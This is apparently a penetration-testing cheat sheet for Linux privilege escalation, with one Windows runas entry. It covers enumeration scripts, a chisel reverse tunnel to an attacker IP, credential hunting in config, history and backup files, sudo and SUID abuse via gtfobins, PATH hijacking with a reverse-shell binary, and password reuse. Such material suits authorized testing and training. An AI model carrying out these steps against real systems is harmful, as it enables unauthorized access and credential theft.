# Linux

## Linpeas
```
./linpeas.sh
```

## Linux-Smart-Enumeration
```
./lse.sh -l <1 or 2> -i
```

## LinEnum
```
./LinEnum.sh -t
```

## Kernel-Exploits
```
uname -a
```
Search results on Google, Exploit-DB, etc.

## Services-Running-As-root
```
ps aux | grep "^root"
```

Take note of any software versions identified and search for known exploits.

## Cron-Jobs
Linpeas/LinEnum/LSE, etc. should pick up any cron jobs that are present that could be exploited.

## Chisel-Port-Forwarding
Start chisel server on your machine with sudo ./chisel server -p 8000 --reverse. Upload the chisel client to the victim and start it with ./chisel client &lt;ATTACKER-IP&gt;:8000 R:&lt;port-to-forward&gt;:127.0.0.1:&lt;port-to-forward&gt;

Port scan your local host to confirm the desired port is now being exposed on your system with nmap 127.0.0.1

## Web-Directory-Configuration-Files
Often times there will be configuration files present in a web server directory that contain credentials. You should always enumerate the web server directories and look for any configuration files that may contain credentials.

## Interesting-Files-Scripts
Look for any interesting files or scripts that are present on the system.

## History-Files
Search any history files (bash history, mysql history, etc.) for any credentials or anything else that could be of interest.

## Backup-Files
Check the following directories for any backup files that may contain information: user's home directories, the / directory, /tmp, and /var/backups

## Sudo
Check what the current user can run as sudo with:
```
sudo -l
```

Check the results of sudo -l against gtfobins to search for any possible privilege escalation.

Run a program as a specific user sudo permissions with:
```
sudo -u <username> <program>
```

Run a program with sudo permissions with:
```
sudo <program>
```

## SUID/gtfobins
Use Linpeas/LinEnum/LSE to search for programs that have SUID. Search gtfobins to see if any can be exploited.

## strace/strings
If you need to figure out what a program is doing (perhaps a SUID), you can run the program with strace to see what it does with:
```
strace -v -f -e execve <program>
```

You can also use strings on it to see the list of commands it is running.

## Path-Exploitation
If an application that can run as root (SUID) does not contain a absolute path to the program, you can create a file with the same name of the program and set your path to a location that you can write to. For example, if there is a SUID program called foo that cats a file with just cat filename.txt, you can make a file called cat with a reverse shell in it. Then you just need to update your path to a location you can write to and create the malicious cat file in that location.

## Password-Reuse
Any passwords found in config files, history files, etc. should be tried against any users present on the system. Make sure to test credentials with SSH and su as well.

```
su <USERNAME>
```

## SSH-Keys
Look for any SSH keys that can be used to gain access to the system.

## pspy
You can use pspy to find any interesting processes that may run every so often on a system. Download pspy on the system and run it with .\\pspy and watch for any interesting output.

## MySQL-Databases
If you have connection strings to a MySQL database, you should connect and look at the databases/tables available. Sometimes there are user/password tables that will contain credentials that can be used elsewhere.

### mysqldump
If a host has mysql running on it and you have database credentials, but the mysql client is not installed on the target, you can try mysqldump:
```
mysqldump -u <USER> -p <DATABASE>    
```

# Windows
## runas
Run a program under the context of a different user on the system:

```
runas /user:<localmachinename>\<user> cmd
```
